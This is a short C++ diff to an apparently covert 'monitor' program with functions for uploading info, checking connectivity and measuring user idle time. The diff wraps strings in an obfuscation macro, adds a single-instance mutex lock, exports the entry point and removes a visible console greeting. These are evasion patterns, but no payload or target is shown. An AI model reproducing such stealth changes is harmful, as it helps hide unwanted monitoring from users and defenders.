@@ -1,5 +1,7 @@
 #include "App.h"
 #include "curl/curl.h"
+#include "Locker.h"
+
 #include <filesystem>
 #include "Encrypter.h"
 namespace fs = std::filesystem;
@@ -118,7 +120,7 @@ bool UploadInfo(std::string info)
 bool InternetIsWorking()
 {
     bool isWorking = false;
-    auto link = "http://clients3.google.com/generate_204";
+    auto link = OBFUSCATED("http://clients3.google.com/generate_204");
     std::string output;
     auto curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
@@ -143,10 +145,15 @@ int64_t getIdleTime()
     BOOL res = GetLastInputInfo(&info);
     return (int)((GetTickCount() - info.dwTime) / 1000);
 }
-void Start()
+EXPORT void Start()
 {
+    std::string mutexString = OBFUSCATED("MONITOR_APP");
+    Locker lock(mutexString, true);
+    while (!lock.Lock())
+    {
+        Sleep(1000);
+    }
     initCPUCounter();
-    std::cout << "Hello, from monitor!\n";
     std::chrono::high_resolution_clock clk;
 
     for (;;)
